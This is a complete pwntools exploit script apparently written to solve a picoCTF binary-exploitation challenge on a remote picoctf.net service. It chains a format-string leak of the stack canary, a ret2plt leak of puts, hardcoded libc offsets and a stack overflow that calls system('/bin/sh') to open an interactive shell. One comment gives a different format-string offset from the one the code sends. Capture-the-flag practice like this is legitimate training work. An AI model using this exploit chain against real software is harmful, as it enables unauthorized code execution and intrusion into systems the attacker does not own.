from pwn import *

REMOTE_HOST = 'shape-facility.picoctf.net'
REMOTE_PORT = 56392

# Connect to remote
p = remote(REMOTE_HOST, REMOTE_PORT)


# Load local binary to access symbols and GOT/PLT
elf = ELF('./vuln')

# Trigger the win() with the magic number
magic_number = b"-3727"
p.recvuntil(b"What number would you like to guess?\n")
p.sendline(magic_number)

# Now send the format string to leak the canary
# Assuming the canary is right after the 512-byte buffer, it's often around %171$p
p.sendline(b"%135$p")

# Read the response
p.recvuntil(b"Congrats: ")
leak = p.recvline().strip()
canary = int(leak, 16)
print(f"[+] Leaked canary: {hex(canary)}")



puts_plt  = elf.plt['puts']
main_addr = elf.symbols['main']
puts_got  = elf.got['puts']



    
p.recvuntil(b"What number would you like to guess?\n")
p.sendline(magic_number)   # trigger win() again


payload = flat(
    b"A" * 512,
    p32(canary),
    b"B" * 12,
    puts_plt,
    main_addr,
    puts_got
)


p.sendlineafter("Name? ", payload)
out = p.recvline()
out = p.recvline()
out = p.recvline()
puts = out.replace(b'\n',b'')
puts = int.from_bytes(puts,'little')
puts = puts & 0xFFFFFFFF
print(f'[+] Leaked puts address: { hex(puts) }')


libc_base = puts - 0x67560
system_addr = libc_base + 0x3cf10
binsh_addr = libc_base + 0x17b9db

print(f"[+] libc base: {hex(libc_base)}")
print(f"[+] system(): {hex(system_addr)}")
print(f"[+] /bin/sh: {hex(binsh_addr)}")

p.recvuntil(b"What number would you like to guess?")
p.sendline(magic_number)   # trigger win() again



payload = (
    b"A"*512 +
    p32(canary) +
    b"A"*12 +
    p32(system_addr) +
    p32(elf.functions['win'].address) +
    p32(binsh_addr)
)


p.sendline(payload)
p.recvlines(2)
p.interactive()











